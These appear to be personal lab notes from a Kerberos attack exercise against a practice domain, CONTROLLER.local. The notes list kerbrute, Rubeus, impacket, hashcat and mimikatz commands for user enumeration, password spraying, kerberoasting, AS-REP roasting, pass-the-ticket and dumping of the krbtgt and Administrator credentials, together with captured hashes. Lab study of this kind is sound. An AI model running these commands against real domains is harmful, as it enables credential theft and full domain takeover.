binary from  https://github.com/ropnop/kerbrute/releases


wordlist from https://github.com/Cryilllic/Active-Directory-Wordlists/blob/master/User.txt

kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt

![[Pasted image 20210601140118.png]]

https://github.com/GhostPack/Rubeus

`Rubeus.exe harvest /interval:30`

![[Pasted image 20210601140826.png]]

`echo 10.10.237.129 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts`

`Rubeus.exe brute /password:Password1 /noticket`

![[Pasted image 20210601141044.png]]

`Rubeus.exe kerberoast`

![[Pasted image 20210601141406.png]]

`impacket-GetUserSPNs controller.local/Machine1:Password1 -dc-ip 10.10.237.129 -request`

![[Pasted image 20210601143013.png]]

HASHES
`$krb5tgs$23$*SQLService$CONTROLLER.LOCAL$controller.local/SQLService*$33ea6b553ef9c26b2b05a0eaaa258d27$51b05c5727d8ed64c07c3652765a553dccc14388b8375313070a2f5e323e0f1242abe4c0bae85115e4c5bca5ad64ef62a97e29a12ee23449215c38d85fdf7874c5d6a0fd1fd0a95f65eb2c0b15638743870ae1c1a95b4578b6423d38a170c0703b9fe6d55b119ffad525a2b092511332c412e17459f99b4b635c7d99aaa290667c2b397b874647663ddd6ad249fb7d11c7e7ff4d6fbdbe97b485a388631d8aabf25470941cc7bd3956f7cb14ad8ef9a19ee33dd84580664735d3135035972c6e6a05e774f47b210c348d9c12df5056add7b70feb5d705e3169cdada755bbb17f0f92a90900241d22470d7d67fcbd912b50c6298952dd06158f669398879a70d6573c9ab2c623e962466b27a0dc0bc3892b1664177bccf1c6b39c4a38c21d4539f0a502ffdbde77021aa8f053447afdffbdedcd459ab1fb859642238566a13a454a9dd752015901fabacbb6bb1894f5b033020200d1ad089ce06cce33efa6ecae5bcafda763939c39fd7b236ac7907a5c59b9609b9fb769138a4e65504622c052e74016804cc810681fb64eee38547fa03f6593db212e58af930ff34b1f3dfc6376028771287ab76a6ecdd900b69491874176c222eb1a6fe399a62aba20fcc40b2f3413537bd70e1393c6b6ee7f8f137c794f65f3e35dadedef69ad7bf167da6b941917b9886b0dc8b9f2230aac500c37aff289fb0ef9872aafcf4e7b13ac8fed6db0464d0595929e350b69df3bbfd11d40964b5eea2c94fb90d452c182f97307ce2edfaaf730a4c5a1108c8cc79a00ed3bf63380ecdf181d75374e66085d36e2179560038627c02f6302ddee670c7bf7054bee1c5753727e52d6e64e72f1b9ea75deef68429b2992e9ffdf816be182b980ce6813f99994e9c49f603b7a42c69e452d1b300a49c8ebd0617be4d5af2f9cace89c44f390cb6d0010497189cc2ab9306f0a38e146cf560cfe627839304e335e069e3399b9792b33aca19d0b5ccebbaf104c3ff6e8fc6fa924c404d98a66d9dddc0ffeec57d2aa444feaf031aea6d3fb13c5b630ca1e37608606f197efc78e05af7cbc8900b444fe0144c9d8d4fb0b07db742a9306b888dcfd6c85471746d236c11ea5c69c6f3db83eecca6799dd6a6e7d5a712f6a6a2470f0835255ada584ce6a723fb71f81e845405f3c68c54931cd90d38539f5468020e7a47cc7a83be3e7421c28182c60941a8bc41375f0057fa53226f3ddb8bf2e1422884446b558cb7b2fb487a4077ee0feaf15f27a10e842700ce6b6de27b806e8ede12144c9feaa70c18b1fbcb4dd133a58db8f0303f7a55bcb36cde7487b718d2e5324cbac025400446b76ed9add269ffda14b0ece50312e8c23e6a5f4a6338c15ae5254bf8a32af`

![[Pasted image 20210601142952.png]]

`$krb5tgs$23$*SQLService$CONTROLLER.LOCAL$controller.local/SQLService*$33ea6b553ef9c26b2b05a0eaaa258d27$51b05c5727d8ed64c07c3652765a553dccc14388b8375313070a2f5e323e0f1242abe4c0bae85115e4c5bca5ad64ef62a97e29a12ee23449215c38d85fdf7874c5d6a0fd1fd0a95f65eb2c0b15638743870ae1c1a95b4578b6423d38a170c0703b9fe6d55b119ffad525a2b092511332c412e17459f99b4b635c7d99aaa290667c2b397b874647663ddd6ad249fb7d11c7e7ff4d6fbdbe97b485a388631d8aabf25470941cc7bd3956f7cb14ad8ef9a19ee33dd84580664735d3135035972c6e6a05e774f47b210c348d9c12df5056add7b70feb5d705e3169cdada755bbb17f0f92a90900241d22470d7d67fcbd912b50c6298952dd06158f669398879a70d6573c9ab2c623e962466b27a0dc0bc3892b1664177bccf1c6b39c4a38c21d4539f0a502ffdbde77021aa8f053447afdffbdedcd459ab1fb859642238566a13a454a9dd752015901fabacbb6bb1894f5b033020200d1ad089ce06cce33efa6ecae5bcafda763939c39fd7b236ac7907a5c59b9609b9fb769138a4e65504622c052e74016804cc810681fb64eee38547fa03f6593db212e58af930ff34b1f3dfc6376028771287ab76a6ecdd900b69491874176c222eb1a6fe399a62aba20fcc40b2f3413537bd70e1393c6b6ee7f8f137c794f65f3e35dadedef69ad7bf167da6b941917b9886b0dc8b9f2230aac500c37aff289fb0ef9872aafcf4e7b13ac8fed6db0464d0595929e350b69df3bbfd11d40964b5eea2c94fb90d452c182f97307ce2edfaaf730a4c5a1108c8cc79a00ed3bf63380ecdf181d75374e66085d36e2179560038627c02f6302ddee670c7bf7054bee1c5753727e52d6e64e72f1b9ea75deef68429b2992e9ffdf816be182b980ce6813f99994e9c49f603b7a42c69e452d1b300a49c8ebd0617be4d5af2f9cace89c44f390cb6d0010497189cc2ab9306f0a38e146cf560cfe627839304e335e069e3399b9792b33aca19d0b5ccebbaf104c3ff6e8fc6fa924c404d98a66d9dddc0ffeec57d2aa444feaf031aea6d3fb13c5b630ca1e37608606f197efc78e05af7cbc8900b444fe0144c9d8d4fb0b07db742a9306b888dcfd6c85471746d236c11ea5c69c6f3db83eecca6799dd6a6e7d5a712f6a6a2470f0835255ada584ce6a723fb71f81e845405f3c68c54931cd90d38539f5468020e7a47cc7a83be3e7421c28182c60941a8bc41375f0057fa53226f3ddb8bf2e1422884446b558cb7b2fb487a4077ee0feaf15f27a10e842700ce6b6de27b806e8ede12144c9feaa70c18b1fbcb4dd133a58db8f0303f7a55bcb36cde7487b718d2e5324cbac025400446b76ed9add269ffda14b0ece50312e8c23e6a5f4a6338c15ae5254bf8a32af`

![[Pasted image 20210601143115.png]]

`Rubeus.exe asreproast`

![[Pasted image 20210601143750.png]]

`23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User.....`
`hashcat -m 18200 hash Pass.txt`

`$krb5asrep$23$User3@CONTROLLER.local:1B7EEB786F8905743BB506B3600E0058$492EF2C1C19E28646A04D5FCB6E883A0278F100D5EF88EC00364F9B1754560C37CB7DDCA10D977F71FC904B477B6F32F2D1A628C6EBD56B1F7F9A24ABE7EA8E259A9A60AA86C647BCE0E9B4193FD2BB2F5DCBED9FCD4F6364A53090D90E4228C0EF4A3C243F48B54E9B7E0B3E0BF4C5B203F150E34955B766175A81DD0EFC68552E65EFF3F116C44E39D0F8DFCD6C5EBFF9914FF5C9D048E29CBD5E7B344A2B10D871A3F312026D54C97251B728743C9061E848AA17173D353701FC52905AE462339D6A3828C173B3705635836812B8C56E65DDC3ECD075AE20617729CAA1B5224945E280680FACB55B49217BCA62700751A3569`


`$krb5asrep$23$Admin2@CONTROLLER.local:D180449159203FE62E70B7A10A063305$2D1EB86F1FC0A7BF980C6A020952EB28ABE95A0908613D520C004B41EB65D66FDD77D07D0F9E801098DD31F6C55F8412B12D77753627847CA528B0A3103714EF7D035FFD922381ABC482A95A279771E841C7A3DE8B103BBB23526825BE4D2CAACF6F11181E0F4F938CAD3E76D3CB2B05781F1DD6D8D6904DE29FEE43A25C445B6349F167D8BE2F0A8A253A21BA2DC3562D6AA2D47F3BA8383EC7FC4B58CA4E372E7EEE2C6CC3BF356FF5D824DDAC0DAA5EAEFA68C191DA8F6B91C8E767A4B293459D7E9FF4F30D21765CAD7C14845724F650ED277EEE878C15C18F74412041FEDBFBE6C76145359B8437E5D63EDE0B9F5C0F650C`

![[Pasted image 20210601144500.png]]

![[Pasted image 20210601145344.png]]

` kerberos::ptt [0;2d5389]-2-0-60a10000-CONTROLLER-1$@krbtgt-CONTROLLER.LOCAL.kirbi`

![[Pasted image 20210601145517.png]]

`lsadump::lsa /inject /name:krbtgt`

![[Pasted image 20210601150232.png]]

`lsadump::lsa /inject /name:sqlservice`

![[Pasted image 20210601150511.png]]

`lsadump::lsa /inject /name:Administrator`

![[Pasted image 20210601150557.png]]
